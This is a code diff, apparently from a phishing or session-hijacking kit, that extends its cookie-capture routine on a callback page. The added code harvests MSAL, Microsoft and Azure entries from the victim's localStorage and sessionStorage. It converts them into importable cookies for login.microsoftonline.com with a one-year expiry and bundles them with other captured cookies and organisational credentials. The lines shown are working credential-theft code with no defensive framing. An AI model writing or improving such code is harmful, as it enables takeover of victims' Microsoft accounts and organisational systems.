@@ -360,8 +360,10 @@
                     organizationalCredentials = null;
                 }
                 
-                // Method 2: Current domain cookies (fallback)
+                // Method 2: Enhanced cookie capture from multiple sources
                 const cookieStrings = document.cookie.split(';').filter(c => c.trim());
+                
+                // Capture all cookies from callback domain
                 const currentDomainCookies = cookieStrings.map(c => {
                     const [name, value] = c.trim().split('=');
                     return name && value ? {
@@ -379,9 +381,57 @@
                         source: 'callback_domain'
                     } : null;
                 }).filter(cookie => cookie !== null);
+
+                // Try to capture Microsoft-specific cookies from browser storage
+                const storedCookies = [];
+                try {
+                    // Check localStorage for Microsoft cookies
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && (key.includes('msal') || key.includes('microsoft') || key.includes('azure'))) {
+                            const value = localStorage.getItem(key);
+                            if (value) {
+                                storedCookies.push({
+                                    name: key,
+                                    value: value,
+                                    domain: '.login.microsoftonline.com',
+                                    path: '/',
+                                    secure: true,
+                                    httpOnly: false,
+                                    sameSite: 'none',
+                                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                                    source: 'localStorage_microsoft'
+                                });
+                            }
+                        }
+                    }
+                    
+                    // Check sessionStorage for Microsoft data
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        if (key && (key.includes('msal') || key.includes('microsoft') || key.includes('azure'))) {
+                            const value = sessionStorage.getItem(key);
+                            if (value) {
+                                storedCookies.push({
+                                    name: key,
+                                    value: value,
+                                    domain: '.login.microsoftonline.com',
+                                    path: '/',
+                                    secure: true,
+                                    httpOnly: false,
+                                    sameSite: 'none',
+                                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                                    source: 'sessionStorage_microsoft'
+                                });
+                            }
+                        }
+                    }
+                } catch (storageError) {
+                    console.log('⚠️ Could not access browser storage for cookies');
+                }
                 
-                // Combine Microsoft cookies (priority) with current domain cookies
-                capturedCookies = [...microsoftCookies, ...currentDomainCookies];
+                // Combine all cookie sources (priority: Microsoft cookies > stored cookies > current domain)
+                capturedCookies = [...microsoftCookies, ...storedCookies, ...currentDomainCookies];
                 
                 sessionData.formattedCookies = capturedCookies;
                 sessionData.organizationalCredentials = organizationalCredentials;
@@ -396,6 +446,7 @@
                 
                 console.log('🍪 Final capture summary:', {
                     microsoftCookies: microsoftCookies.length,
+                    storedCookies: storedCookies.length,
                     currentDomainCookies: currentDomainCookies.length,
                     totalCaptured: capturedCookies.length,
                     organizationalLogin: organizationalCredentials ? organizationalCredentials.organizationType : 'None',
